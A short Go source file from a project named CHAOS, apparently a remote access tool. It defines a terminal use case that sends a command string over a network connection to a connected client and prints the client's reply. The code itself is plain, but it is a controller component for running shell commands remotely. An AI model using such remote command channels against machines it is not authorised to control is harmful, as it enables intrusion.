package terminal

import (
	"fmt"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/internal/models"
	"github.com/tiagorlampert/CHAOS/internal/usecase"
	"github.com/tiagorlampert/CHAOS/internal/util/network"
	"net"
)

type TerminalUseCase struct {
	Connection net.Conn
}

func NewTerminalUseCase(conn net.Conn) usecase.Terminal {
	return &TerminalUseCase{
		Connection: conn,
	}
}

func (t TerminalUseCase) Run(cmd string) {
	if err := network.Send(t.Connection, models.Message{
		Command: "terminal",
		Data:    []byte(cmd),
	}); err != nil {
		log.WithField("cause", err.Error()).Error("error sending command request")
	}

	response, err := network.Read(t.Connection)
	if err != nil {
		log.WithField("cause", err.Error()).Error("error reading response")
	}

	fmt.Println(string(response.Data))
}
